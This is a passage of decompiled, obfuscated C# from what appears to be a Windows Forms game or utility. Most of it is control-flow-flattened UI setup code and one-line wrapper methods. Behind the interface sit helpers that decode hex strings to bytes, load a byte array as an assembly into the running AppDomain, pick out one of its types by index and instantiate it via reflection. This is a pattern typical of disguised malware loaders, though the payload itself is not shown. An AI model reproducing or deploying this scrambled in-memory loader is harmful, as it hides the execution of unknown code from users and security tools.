				case 18u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1140200479) ^ -1155379214;
					continue;
				case 17u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 1958322344) ^ 0x4BB07CDA);
					continue;
				case 16u:
					num = (int)(num2 * 345850154) ^ -2067078899;
					continue;
				case 15u:
					num = (int)((num2 * 1110744904) ^ 0x12754B20);
					continue;
				case 14u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1350801214) ^ -406264167;
					continue;
				case 13u:
					num = ((int)num2 * -1187567230) ^ -1651814955;
					continue;
				case 12u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -2008751506) ^ 0x4301B061;
					continue;
				case 11u:
					num = (int)((num2 * 1735528322) ^ 0x6120E12D);
					continue;
				case 10u:
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1462036351) ^ 0x4ACD14D0;
					continue;
				case 9u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 1544522133) ^ -475938956;
					continue;
				case 8u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -919168189) ^ 0x5D37985F;
					continue;
				case 7u:
					num = (int)((num2 * 844520434) ^ 0x18CA5DD6);
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -1518723202) ^ -1155745208;
					continue;
				case 5u:
					num = (int)(num2 * 1667368571) ^ -1457487614;
					continue;
				case 4u:
					num = (int)((num2 * 1361743072) ^ 0x72C5F91D);
					continue;
				case 3u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 804597434) ^ -1003331367;
					continue;
				case 2u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 848562558) ^ 0x303B8F4F);
					continue;
				case 1u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 470923191) ^ -412772424;
					continue;
				case 0u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -1943674567) ^ -1972827934;
					continue;
				default:
					return;
				case 126u:
					break;
				case 100u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = 127464285;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3B8EAB47u) % 3u)
				{
				case 1u:
					goto IL_0009;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = ((int)num2 * -1925353540) ^ 0x525AE31C;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return Form1.smethod_94(Form1.smethod_93(), Position);
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
